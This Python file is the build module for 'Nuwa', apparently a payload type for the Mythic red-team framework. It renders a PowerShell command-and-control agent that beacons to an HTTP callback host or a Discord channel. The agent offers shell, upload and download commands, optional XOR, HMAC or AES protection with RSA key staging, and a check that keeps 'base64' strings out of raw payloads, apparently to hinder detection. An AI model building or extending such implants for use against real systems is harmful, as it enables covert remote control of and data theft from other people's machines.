from __future__ import annotations

import base64
import binascii
import json
import pathlib
import re
from dataclasses import dataclass
from types import SimpleNamespace
from typing import Any
from urllib.parse import urlsplit


try:
    from mythic_container.PayloadBuilder import (
        BuildParameter,
        BuildParameterType,
        BuildResponse,
        BuildStatus,
        BuildStep,
        C2ParameterDeviation,
        PayloadType,
        SupportedOS,
    )
except ImportError:  # pragma: no cover - local unit test fallback
    class SupportedOS:
        Windows = "Windows"

    class BuildParameterType:
        String = "String"
        Number = "Number"
        Boolean = "Boolean"
        Dictionary = "Dictionary"
        ChooseOne = "ChooseOne"

    @dataclass
    class BuildParameter:
        name: str
        parameter_type: str
        description: str = ""
        default_value: Any = None
        required: bool = False
        choices: list[str] | None = None

    class BuildStatus:
        Success = "success"
        Error = "error"

    @dataclass
    class BuildResponse:
        status: str
        payload: bytes = b""
        build_message: str = ""
        build_stderr: str = ""
        build_stdout: str = ""

        def set_status(self, status: str) -> None:
            self.status = status

    @dataclass
    class BuildStep:
        step_name: str
        step_description: str

    class C2ParameterDeviation:
        def __init__(
            self,
            supported: bool,
            choices: list[str] | None = None,
            dictionary_choices: list[Any] | None = None,
            default_value: Any = None,
            **kwargs: Any,
        ) -> None:
            self.Supported = supported
            self.Choices = choices
            self.DictionaryChoices = dictionary_choices
            self.DefaultValue = default_value

    class PayloadType:
        uuid: str = ""
        c2info: list[Any] = []
        commands: Any = None
        selected_os: str = SupportedOS.Windows
        _parameter_values: dict[str, Any]

        def __init__(self, *args, **kwargs):
            self._parameter_values = {}
            self.commands = SimpleNamespace(get_commands=lambda: [])

        def get_parameter(self, name: str) -> Any:
            for parameter in getattr(self, "build_parameters", []):
                if parameter.name == name and name not in self._parameter_values:
                    return parameter.default_value
            return self._parameter_values.get(name)


AGENT_ROOT = pathlib.Path(__file__).resolve().parents[2]
AGENT_CODE_ROOT = AGENT_ROOT / "agent_code"
BASE_CODE_ROOT = AGENT_CODE_ROOT / "base"
CODEC_ROOT = AGENT_CODE_ROOT / "codecs"
COMMAND_ROOT = AGENT_CODE_ROOT / "commands"
PROFILE_ROOT = AGENT_CODE_ROOT / "profiles"
FRAMING_ROOT = AGENT_CODE_ROOT / "framing"
DISCORD_PROFILE_ROOT = PROFILE_ROOT / "discord"
DISCORD_ENVELOPE_CODEC_ROOT = DISCORD_PROFILE_ROOT / "envelope_codecs"
PROTECTION_ROOT = AGENT_CODE_ROOT / "protection"
PROTECTION_PROFILE_ROOT = PROTECTION_ROOT / "profiles"
STAGING_ROOT = AGENT_CODE_ROOT / "staging"
DEFAULT_COMMANDS = ["sleep", "cd", "whoami", "hostname", "exit", "ls", "shell", "upload", "download"]
POWERSHELL_CODEC_PROFILES = tuple(
    sorted(path.stem for path in CODEC_ROOT.glob("*.ps1") if path.is_file())
)
POWERSHELL_DISCORD_ENVELOPE_CODECS = tuple(
    sorted(
        path.stem
        for path in DISCORD_ENVELOPE_CODEC_ROOT.glob("*.ps1")
        if path.is_file()
    )
)
FORBIDDEN_RAW_ARTIFACT_PATTERN = re.compile(rb"(?:base64|b64)", re.IGNORECASE)
PROTECTION_NONE = "none"
PROTECTION_XOR_V1 = "nuwa_xor_v1"
PROTECTION_HMAC_SHA256_V1 = "nuwa_hmac_sha256_v1"
PROTECTION_AES256_HMAC_V1 = "nuwa_aes256_hmac_v1"
PROTECTED_PROFILES = (
    PROTECTION_XOR_V1,
    PROTECTION_HMAC_SHA256_V1,
    PROTECTION_AES256_HMAC_V1,
)
PROTECTION_CHOICES = (PROTECTION_NONE, *PROTECTED_PROFILES)
LEGACY_UNVERSIONED_PROTECTION = "aes256_hmac"


@dataclass(frozen=True)
class SelectedC2Profile:
    name: str
    parameters: dict[str, Any]


@dataclass(frozen=True)
class ProtectionSelection:
    profile: str
    key: bytes | None


def _read_text(path: pathlib.Path) -> str:
    return path.read_text(encoding="utf-8").strip() + "\n"


def _ps_literal(value: Any) -> str:
    if isinstance(value, bool):
        return "$true" if value else "$false"
    if value is None:
        return "$null"
    if isinstance(value, (int, float)):
        return str(value)
    if isinstance(value, (list, tuple)):
        return "@(" + ", ".join(_ps_literal(item) for item in value) + ")"
    text = str(value).replace('"', '`"')
    return f'"{text}"'


def _ps_hashtable(mapping: dict[str, Any], *, indent: str = "    ") -> str:
    lines = ["@{"]
    for key, value in mapping.items():
        if isinstance(value, dict):
            rendered = _ps_hashtable(value, indent=indent + "    ")
            lines.append(f'{indent}"{key}" = {rendered}')
        else:
            lines.append(f'{indent}"{key}" = {_ps_literal(value)}')
    lines.append("}")
    return "\n".join(lines)


def _ps_byte_array(value: bytes) -> str:
    return "[byte[]]@(" + ", ".join(str(item) for item in value) + ")"


def _crypto_field(value: Any, *names: str) -> Any:
    if isinstance(value, dict):
        for name in names:
            if name in value:
                return value[name]
        lowered = {str(key).lower(): item for key, item in value.items()}
        for name in names:
            if name.lower() in lowered:
                return lowered[name.lower()]
        return None

    for name in names:
        if hasattr(value, name):
            return getattr(value, name)
    return None


def _key_material_is_present(value: Any) -> bool:
    return value is not None and value != "" and value != b""


def _decode_crypto_key(value: Any, *, field_name: str) -> bytes:
    if isinstance(value, bytes):
        decoded = value
    elif isinstance(value, str):
        try:
            decoded = base64.b64decode(value, validate=True)
        except (binascii.Error, ValueError) as exc:
            raise ValueError(f"{field_name} key must use strict Base64 encoding") from exc
    else:
        raise ValueError(f"{field_name} key must be a Base64 string or bytes")

    if len(decoded) != 32:
        raise ValueError(f"{field_name} key must decode to exactly one 32-byte key")
    return bytes(decoded)


def _resolve_protection_selection(value: Any) -> ProtectionSelection:
    if value is None or value == "":
        return ProtectionSelection(profile=PROTECTION_NONE, key=None)

    if isinstance(value, str):
        profile = value.strip().lower()
        enc_key = None
        dec_key = None
    else:
        profile = str(_crypto_field(value, "value", "Value") or PROTECTION_NONE)
        profile = profile.strip().lower()
        enc_key = _crypto_field(value, "enc_key", "EncKey")
        dec_key = _crypto_field(value, "dec_key", "DecKey")

    has_enc_key = _key_material_is_present(enc_key)
    has_dec_key = _key_material_is_present(dec_key)
    if profile in {PROTECTION_NONE, ""}:
        if has_enc_key or has_dec_key:
            raise ValueError("none protection must not carry key material")
        return ProtectionSelection(profile=PROTECTION_NONE, key=None)

    if profile == LEGACY_UNVERSIONED_PROTECTION:
        if has_enc_key or has_dec_key:
            raise ValueError(
                "unversioned aes256_hmac key material is not valid for a Nuwa build"
            )
        return ProtectionSelection(profile=PROTECTION_NONE, key=None)

    if profile not in PROTECTED_PROFILES:
        raise ValueError(f"unsupported Nuwa protection profile '{profile}'")
    if not has_enc_key or not has_dec_key:
        raise ValueError(f"{profile} requires matching 32-byte encryption and decryption keys")

    decoded_enc_key = _decode_crypto_key(enc_key, field_name="encryption")
    decoded_dec_key = _decode_crypto_key(dec_key, field_name="decryption")
    if decoded_enc_key != decoded_dec_key:
        raise ValueError("Nuwa protection encryption and decryption keys must match")
    return ProtectionSelection(profile=profile, key=decoded_enc_key)


def _coerce_require_https(value: Any) -> bool:
    if value is None:
        return False
    if isinstance(value, bool):
        return value
    if isinstance(value, str):
        normalized = value.strip().lower()
        if normalized == "true":
            return True
        if normalized == "false":
            return False
    raise ValueError("require_https must be a Boolean true or false value")


def _coerce_encrypted_exchange(c2_profile_name: str, value: Any) -> bool:
    if value is None or value == "":
        return False
    if c2_profile_name == "http":
        if isinstance(value, bool):
            return value
        if isinstance(value, str):
            normalized = value.strip().lower()
            if normalized == "true":
                return True
            if normalized == "false":
                return False
        raise ValueError("HTTP encrypted_exchange_check must be Boolean true or false")
    if c2_profile_name == "discord":
        if isinstance(value, str):
            normalized = value.strip().upper()
            if normalized == "T":
                return True
            if normalized == "F":
                return False
        raise ValueError("Discord encrypted_exchange_check must be 'T' or 'F'")
    raise ValueError(f"Unsupported Nuwa C2 profile '{c2_profile_name}'")


def _validate_https_policy(
    *,
    c2_profile_name: str,
    c2_parameters: dict[str, Any],
    require_https: bool,
) -> None:
    if not require_https or c2_profile_name == "discord":
        return
    if c2_profile_name != "http":
        raise ValueError(f"Unsupported Nuwa C2 profile '{c2_profile_name}'")

    callback_host = str(c2_parameters.get("callback_host", "")).strip()
    parsed = urlsplit(callback_host)
    if parsed.scheme.lower() != "https" or not parsed.hostname:
        raise ValueError("require_https requires an HTTP callback_host using HTTPS")


def _replace_source_once(source: str, old: str, new: str, *, label: str) -> str:
    count = source.count(old)
    if count != 1:
        raise ValueError(
            f"Protected agent source expected one {label} marker but found {count}"
        )
    return source.replace(old, new, 1)


def _render_protected_agent_main_source() -> str:
    source = _read_text(BASE_CODE_ROOT / "agent_main.ps1")
    source = _replace_source_once(
        source,
        '    Write-NuwaDebug "Response JSON: $decodedJson"\n',
        "",
        label="response-body debug",
    )
    source = _replace_source_once(
        source,
        "$response = Invoke-NuwaSendMessage -Uuid $script:NuwaConfig.PayloadUUID -Action 'checkin'",
        "$response = Invoke-NuwaSendMessage -Uuid $script:NuwaCryptoState.OuterUuid -Action 'checkin'",
        label="check-in transport UUID",
    )
    return source


def _render_staged_agent_runtime_source() -> str:
    source = _render_protected_agent_main_source()
    source = _replace_source_once(
        source,
        "            $script:NuwaState.CallbackUUID = [string]$response.id\n",
        "\n".join(
            [
                "            $callbackUuid = [string]$response.id",
                "            $script:NuwaCryptoState = @{",
                "                OuterUuid = $callbackUuid",
                "                Key = [byte[]]$script:NuwaCryptoState.Key",
                "            }",
                "            $script:NuwaState.CallbackUUID = $callbackUuid",
                "",
            ]
        ),
        label="staged callback crypto-state transition",
    )
    return _replace_source_once(
        source,
        "\nStart-Nuwa\n",
        "\n",
        label="protected auto-start",
    )


def _resolve_selected_c2_profile(c2info: list[Any]) -> SelectedC2Profile:
    if len(c2info) != 1:
        raise ValueError("Nuwa build requires exactly one C2 profile")

    c2 = c2info[0]
    profile = c2.get_c2profile()
    profile_name = str(profile.get("name", "")).strip().lower()
    if profile_name not in {"http", "discord"}:
        raise ValueError(f"Unsupported Nuwa C2 profile '{profile_name}'")

    return SelectedC2Profile(
        name=profile_name,
        parameters=dict(c2.get_parameters_dict()),
    )


def _coerce_use_base64(value: Any) -> bool:
    if value is None:
        return True
    if isinstance(value, bool):
        return value
    if isinstance(value, str):
        normalized = value.strip().lower()
        if normalized == "true":
            return True
        if normalized == "false":
            return False
    raise ValueError("use_base64 must be a Boolean true or false value")


def _resolve_framing_mode(
    c2_profile_name: str,
    c2_parameters: dict[str, Any],
) -> str:
    if c2_profile_name in {"http", "discord"}:
        return "legacy" if _coerce_use_base64(c2_parameters.get("use_base64")) else "raw"
    raise ValueError(f"Unsupported Nuwa C2 profile '{c2_profile_name}'")


def _validate_raw_parameters(c2_profile_name: str, c2_parameters: dict[str, Any]) -> None:
    if any(
        str(c2_parameters.get(name, "")).strip()
        for name in ("proxy_user", "proxy_pass")
    ):
        raise ValueError(
            f"Raw {c2_profile_name.upper()} credentialed proxies require legacy mode"
        )

    if c2_profile_name != "http":
        return

    headers = dict(c2_parameters.get("headers", {}))
    for name, value in headers.items():
        if str(name).lower() != "x-mythic-body-format":
            continue
        if str(value).strip().lower() != "raw-v1":
            raise ValueError(
                "X-Mythic-Body-Format conflicts with the required raw-v1 selector"
            )


def _validate_raw_artifact(payload: bytes) -> None:
    if FORBIDDEN_RAW_ARTIFACT_PATTERN.search(payload) is not None:
        raise ValueError("Raw artifact violates the forbidden-token invariant")


def _validate_staged_raw_artifact(payload: bytes, staging_module: bytes) -> None:
    if payload.count(staging_module) != 1:
        raise ValueError("Staged raw artifact must contain exactly one staging module")
    without_staging_module = payload.replace(staging_module, b"", 1)
    _validate_raw_artifact(without_staging_module)
    for legacy_marker in (
        b"ConvertTo-NuwaTransportEnvelope",
        b"ConvertFrom-NuwaTransportEnvelope",
        b"ConvertTo-NuwaBase64String",
        b"ConvertFrom-NuwaBase64String",
    ):
        if legacy_marker in payload:
            raise ValueError("Staged raw artifact contains legacy framing helpers")


def _base_config(
    *,
    payload_uuid: str,
    c2_profile_name: str,
    c2_parameters: dict[str, Any],
    codec_profile: str,
    debug_logging: bool,
    framing_mode: str,
    discord_envelope_codec: str,
) -> dict[str, Any]:
    config = {
        "PayloadUUID": payload_uuid,
        "C2Profile": c2_profile_name,
        "CallbackInterval": int(c2_parameters.get("callback_interval", 3)),
        "CallbackJitter": int(c2_parameters.get("callback_jitter", 30)),
        "ProxyHost": str(c2_parameters.get("proxy_host", "")),
        "ProxyPort": str(c2_parameters.get("proxy_port", "")),
        "Killdate": str(c2_parameters.get("killdate", "")),
        "CodecProfile": codec_profile,
        "DecodeCodecProfiles": POWERSHELL_CODEC_PROFILES,
        "DebugLogging": bool(debug_logging),
        "MessageUuidLength": 36,
    }
    if framing_mode == "legacy":
        config["ProxyUser"] = str(c2_parameters.get("proxy_user", ""))
        config["ProxyPass"] = str(c2_parameters.get("proxy_pass", ""))
    if c2_profile_name == "discord":
        config["DiscordEnvelopeCodec"] = discord_envelope_codec
        config["DiscordEnvelopeDecodeCodecs"] = POWERSHELL_DISCORD_ENVELOPE_CODECS
    return config


def _profile_config(c2_profile_name: str, c2_parameters: dict[str, Any]) -> dict[str, Any]:
    if c2_profile_name == "http":
        return {
            "CallbackHost": str(c2_parameters.get("callback_host", "")),
            "CallbackPort": str(c2_parameters.get("callback_port", "80")),
            "PostUri": str(c2_parameters.get("post_uri", "")),
            "Headers": dict(c2_parameters.get("headers", {})),
        }
    if c2_profile_name == "discord":
        return {
            "DiscordToken": str(c2_parameters.get("discord_token", "")),
            "BotChannel": str(c2_parameters.get("bot_channel", "")),
            "MessageChecks": int(c2_parameters.get("message_checks", 10)),
            "TimeBetweenChecks": int(c2_parameters.get("time_between_checks", 10)),
        }
    raise ValueError(f"Unsupported Nuwa C2 profile '{c2_profile_name}'")


def render_payload_source(
    *,
    payload_uuid: str,
    c2_profile_name: str,
    c2_parameters: dict[str, Any],
    codec_profile: str,
    debug_logging: bool,
    command_names: list[str],
    discord_envelope_codec: str = "decimal",
) -> str:
    c2_profile_name = str(c2_profile_name or "").strip().lower()
    codec_profile = str(codec_profile or "").strip().lower()
    if codec_profile not in POWERSHELL_CODEC_PROFILES:
        raise ValueError(f"Unsupported codec profile '{codec_profile}'")
    discord_envelope_codec = str(discord_envelope_codec or "").strip().lower()
    if "decimal" not in POWERSHELL_DISCORD_ENVELOPE_CODECS:
        raise ValueError("Discord envelope codec registry must contain 'decimal'")
    if discord_envelope_codec not in {
        "legacy-json",
        *POWERSHELL_DISCORD_ENVELOPE_CODECS,
    }:
        raise ValueError(
            f"Unsupported Discord envelope codec '{discord_envelope_codec}'"
        )

    framing_mode = _resolve_framing_mode(c2_profile_name, c2_parameters)
    if framing_mode == "raw":
        _validate_raw_parameters(c2_profile_name, c2_parameters)

    config = _base_config(
        payload_uuid=payload_uuid,
        c2_profile_name=c2_profile_name,
        c2_parameters=c2_parameters,
        codec_profile=codec_profile,
        debug_logging=debug_logging,
        framing_mode=framing_mode,
        discord_envelope_codec=discord_envelope_codec,
    )
    config.update(_profile_config(c2_profile_name, c2_parameters))

    sections = [
        "$script:NuwaConfig = " + _ps_hashtable(config),
        "$script:NuwaState = @{ \"CurrentDirectory\" = (Get-Location).Path; \"ExitRequested\" = $false }",
        _read_text(BASE_CODE_ROOT / "utf8.ps1"),
    ]
    if framing_mode == "legacy":
        sections.extend(
            [
                _read_text(BASE_CODE_ROOT / "base64.ps1"),
                _read_text(BASE_CODE_ROOT / "transport.ps1"),
            ]
        )
    sections.extend(
        [
            _read_text(FRAMING_ROOT / framing_mode / "functions.ps1"),
            _read_text(
                PROFILE_ROOT / c2_profile_name / "framing" / framing_mode / "functions.ps1"
            ),
            _read_text(BASE_CODE_ROOT / "runtime_helpers.ps1"),
            _read_text(BASE_CODE_ROOT / "codec_dispatch.ps1"),
        ]
    )
    for decoder_profile in POWERSHELL_CODEC_PROFILES:
        sections.append(_read_text(CODEC_ROOT / f"{decoder_profile}.ps1"))
    if c2_profile_name == "discord":
        sections.append(_read_text(DISCORD_PROFILE_ROOT / "envelope_codec_dispatch.ps1"))
        for envelope_profile in POWERSHELL_DISCORD_ENVELOPE_CODECS:
            sections.append(
                _read_text(DISCORD_ENVELOPE_CODEC_ROOT / f"{envelope_profile}.ps1")
            )
    sections.append(_read_text(PROFILE_ROOT / c2_profile_name / "transport.ps1"))

    selected_commands = command_names or list(DEFAULT_COMMANDS)
    for command_name in selected_commands:
        command_path = COMMAND_ROOT / f"{command_name}.ps1"
        if command_path.exists():
            sections.append(_read_text(command_path))

    sections.append(_read_text(BASE_CODE_ROOT / "agent_main.ps1"))
    rendered_source = "\n\n".join(sections) + "\n"
    if framing_mode == "raw":
        _validate_raw_artifact(rendered_source.encode("utf-8"))
    return rendered_source


def render_protected_payload_source(
    *,
    payload_uuid: str,
    c2_profile_name: str,
    c2_parameters: dict[str, Any],
    codec_profile: str,
    debug_logging: bool,
    command_names: list[str],
    protection_profile: str,
    protection_key: bytes,
    discord_envelope_codec: str = "decimal",
    staging_enabled: bool = False,
) -> str:
    c2_profile_name = str(c2_profile_name or "").strip().lower()
    codec_profile = str(codec_profile or "").strip().lower()
    if codec_profile not in POWERSHELL_CODEC_PROFILES:
        raise ValueError(f"Unsupported codec profile '{codec_profile}'")
    discord_envelope_codec = str(discord_envelope_codec or "").strip().lower()
    if "decimal" not in POWERSHELL_DISCORD_ENVELOPE_CODECS:
        raise ValueError("Discord envelope codec registry must contain 'decimal'")
    if discord_envelope_codec not in {
        "legacy-json",
        *POWERSHELL_DISCORD_ENVELOPE_CODECS,
    }:
        raise ValueError(
            f"Unsupported Discord envelope codec '{discord_envelope_codec}'"
        )

    protection_profile = str(protection_profile or "").strip().lower()
    if protection_profile not in PROTECTED_PROFILES:
        raise ValueError(f"Unsupported protected profile '{protection_profile}'")
    if not isinstance(protection_key, bytes) or len(protection_key) != 32:
        raise ValueError("Protected payload rendering requires one 32-byte key")
    if not isinstance(staging_enabled, bool):
        raise ValueError("staging_enabled must be Boolean")
    if staging_enabled and protection_profile != PROTECTION_AES256_HMAC_V1:
        raise ValueError(
            "RSA staging requires the nuwa_aes256_hmac_v1 protection profile"
        )
    profile_path = PROTECTION_PROFILE_ROOT / f"{protection_profile}.ps1"
    if not profile_path.is_file():
        raise ValueError(f"Missing PowerShell protection profile '{protection_profile}'")

    framing_mode = _resolve_framing_mode(c2_profile_name, c2_parameters)
    if framing_mode == "raw":
        _validate_raw_parameters(c2_profile_name, c2_parameters)

    config = _base_config(
        payload_uuid=payload_uuid,
        c2_profile_name=c2_profile_name,
        c2_parameters=c2_parameters,
        codec_profile=codec_profile,
        debug_logging=debug_logging,
        framing_mode=framing_mode,
        discord_envelope_codec=discord_envelope_codec,
    )
    config.update(_profile_config(c2_profile_name, c2_parameters))
    config["ProtectionProfile"] = protection_profile
    crypto_state = "\n".join(
        [
            "@{",
            f'    "OuterUuid" = {_ps_literal(payload_uuid)}',
            f'    "Key" = {_ps_byte_array(protection_key)}',
            "}",
        ]
    )

    sections = [
        "$script:NuwaConfig = " + _ps_hashtable(config),
        "$script:NuwaState = @{ \"CurrentDirectory\" = (Get-Location).Path; \"ExitRequested\" = $false }",
        "$script:NuwaCryptoState = " + crypto_state,
        _read_text(BASE_CODE_ROOT / "utf8.ps1"),
    ]
    if framing_mode == "legacy":
        sections.extend(
            [
                _read_text(BASE_CODE_ROOT / "base64.ps1"),
                _read_text(BASE_CODE_ROOT / "transport.ps1"),
            ]
        )
    sections.extend(
        [
            _read_text(FRAMING_ROOT / framing_mode / "functions.ps1"),
            _read_text(
                PROFILE_ROOT / c2_profile_name / "framing" / framing_mode / "functions.ps1"
            ),
            _read_text(BASE_CODE_ROOT / "runtime_helpers.ps1"),
            _read_text(profile_path),
            _read_text(PROTECTION_ROOT / "protected_codec_dispatch.ps1"),
        ]
    )
    for decoder_profile in POWERSHELL_CODEC_PROFILES:
        sections.append(_read_text(CODEC_ROOT / f"{decoder_profile}.ps1"))
    if c2_profile_name == "discord":
        sections.append(_read_text(DISCORD_PROFILE_ROOT / "envelope_codec_dispatch.ps1"))
        for envelope_profile in POWERSHELL_DISCORD_ENVELOPE_CODECS:
            sections.append(
                _read_text(DISCORD_ENVELOPE_CODEC_ROOT / f"{envelope_profile}.ps1")
            )
    sections.append(_read_text(PROFILE_ROOT / c2_profile_name / "transport.ps1"))

    selected_commands = command_names or list(DEFAULT_COMMANDS)
    for command_name in selected_commands:
        command_path = COMMAND_ROOT / f"{command_name}.ps1"
        if command_path.exists():
            sections.append(_read_text(command_path))

    staging_module = ""
    if staging_enabled:
        staging_module = _read_text(STAGING_ROOT / "rsa.ps1")
        sections.extend(
            [
                staging_module,
                _render_staged_agent_runtime_source(),
                _read_text(STAGING_ROOT / "agent_main.ps1"),
            ]
        )
    else:
        sections.append(_render_protected_agent_main_source())
    rendered_source = "\n\n".join(sections) + "\n"
    if framing_mode == "raw":
        rendered_bytes = rendered_source.encode("utf-8")
        if staging_enabled:
            _validate_staged_raw_artifact(
                rendered_bytes,
                staging_module.encode("utf-8"),
            )
        else:
            _validate_raw_artifact(rendered_bytes)
    return rendered_source


class Nuwa(PayloadType):
    name = "nuwa"
    file_extension = "ps1"
    author = "@openai"
    supported_os = [SupportedOS.Windows]
    wrapper = False
    wrapped_payloads: list[str] = []
    supports_dynamic_loading = False
    mythic_encrypts = False
    translation_container = "nuwa_translation"
    c2_profiles = ["http", "discord"]
    message_uuid_length = 36
    note = "Windows PowerShell 5.1 agent using a translation container for custom wire encoding."
    agent_path = pathlib.Path(".") / "nuwa" / "mythic"
    agent_code_path = pathlib.Path(".") / "nuwa" / "agent_code"
    agent_icon_path = agent_path / "nuwa.svg"
    build_steps = [
        BuildStep(step_name="Render", step_description="Rendering PowerShell payload"),
    ]
    c2_parameter_deviations = {
        "http": {
            "AESPSK": C2ParameterDeviation(
                supported=True,
                choices=list(PROTECTION_CHOICES),
                default_value=PROTECTION_NONE,
            ),
            "encrypted_exchange_check": C2ParameterDeviation(
                supported=True,
                default_value=False,
            ),
        },
        "discord": {
            "AESPSK": C2ParameterDeviation(
                supported=True,
                choices=list(PROTECTION_CHOICES),
                default_value=PROTECTION_NONE,
            ),
            "encrypted_exchange_check": C2ParameterDeviation(
                supported=True,
                choices=["T", "F"],
                default_value="F",
            ),
        },
    }
    build_parameters = [
        BuildParameter(
            name="codec_profile",
            parameter_type=BuildParameterType.ChooseOne,
            choices=list(POWERSHELL_CODEC_PROFILES),
            default_value="decimal",
            description="Nuwa wire codec profile",
        ),
        BuildParameter(
            name="debug_logging",
            parameter_type=BuildParameterType.Boolean,
            default_value=False,
            description="Enable debug output in the payload",
        ),
        BuildParameter(
            name="discord_envelope_codec",
            parameter_type=BuildParameterType.ChooseOne,
            choices=["legacy-json", *POWERSHELL_DISCORD_ENVELOPE_CODECS],
            default_value="decimal",
            description="Discord channel wrapper envelope codec",
        ),
        BuildParameter(
            name="require_https",
            parameter_type=BuildParameterType.Boolean,
            default_value=False,
            description="Reject HTTP callback URLs that do not use HTTPS",
        ),
    ]

    async def build(self) -> BuildResponse:
        response = BuildResponse(status=BuildStatus.Success)
        try:
            selected_c2 = _resolve_selected_c2_profile(self.c2info)
            protection = _resolve_protection_selection(
                selected_c2.parameters.get("AESPSK")
            )
            raw_protection_value = selected_c2.parameters.get("AESPSK")
            raw_protection_profile = str(
                _crypto_field(raw_protection_value, "value", "Value")
                if not isinstance(raw_protection_value, str)
                else raw_protection_value
            ).strip().lower()
            exchange_enabled = _coerce_encrypted_exchange(
                selected_c2.name,
                selected_c2.parameters.get("encrypted_exchange_check"),
            )
            require_https = _coerce_require_https(
                self.get_parameter("require_https")
            )
            _validate_https_policy(
                c2_profile_name=selected_c2.name,
                c2_parameters=selected_c2.parameters,
                require_https=require_https,
            )
            legacy_plaintext_exchange = (
                raw_protection_profile == LEGACY_UNVERSIONED_PROTECTION
                and protection.profile == PROTECTION_NONE
            )
            if (
                exchange_enabled
                and protection.profile != PROTECTION_AES256_HMAC_V1
                and not legacy_plaintext_exchange
            ):
                raise ValueError(
                    "Nuwa RSA staging requires the nuwa_aes256_hmac_v1 "
                    "protection profile and one matching 32-byte key"
                )
            staging_enabled = (
                exchange_enabled
                and protection.profile == PROTECTION_AES256_HMAC_V1
            )

            render_arguments = {
                "payload_uuid": self.uuid,
                "c2_profile_name": selected_c2.name,
                "c2_parameters": selected_c2.parameters,
                "codec_profile": str(self.get_parameter("codec_profile") or "decimal"),
                "discord_envelope_codec": str(
                    self.get_parameter("discord_envelope_codec") or "decimal"
                ),
                "debug_logging": bool(self.get_parameter("debug_logging")),
                "command_names": list(self.commands.get_commands()),
            }
            if protection.profile == PROTECTION_NONE:
                payload_source = render_payload_source(**render_arguments)
            else:
                if protection.key is None:  # defensive type narrowing
                    raise ValueError("Protected payload rendering requires key material")
                payload_source = render_protected_payload_source(
                    **render_arguments,
                    protection_profile=protection.profile,
                    protection_key=protection.key,
                    staging_enabled=staging_enabled,
                )
            response.payload = payload_source.encode("utf-8")
            if protection.profile == PROTECTION_NONE:
                response.build_message = "Successfully built Nuwa PowerShell payload"
            elif staging_enabled:
                response.build_message = (
                    "Successfully built Nuwa PowerShell payload with staged RSA "
                    "session keys; protected profiles require Windows PowerShell "
                    "Full Language Mode"
                )
            else:
                response.build_message = (
                    "Successfully built Nuwa PowerShell payload; protected profiles "
                    "require Windows PowerShell Full Language Mode"
                )
        except Exception as exc:  # pragma: no cover - exercised in integration
            response.set_status(BuildStatus.Error)
            response.build_stderr = str(exc)
        return response


__all__ = [
    "BuildParameter",
    "BuildParameterType",
    "BuildResponse",
    "BuildStatus",
    "C2ParameterDeviation",
    "Nuwa",
    "POWERSHELL_CODEC_PROFILES",
    "POWERSHELL_DISCORD_ENVELOPE_CODECS",
    "PROTECTED_PROFILES",
    "PROTECTION_AES256_HMAC_V1",
    "PROTECTION_CHOICES",
    "PROTECTION_HMAC_SHA256_V1",
    "PROTECTION_NONE",
    "PROTECTION_XOR_V1",
    "PayloadType",
    "ProtectionSelection",
    "SupportedOS",
    "render_protected_payload_source",
    "render_payload_source",
]
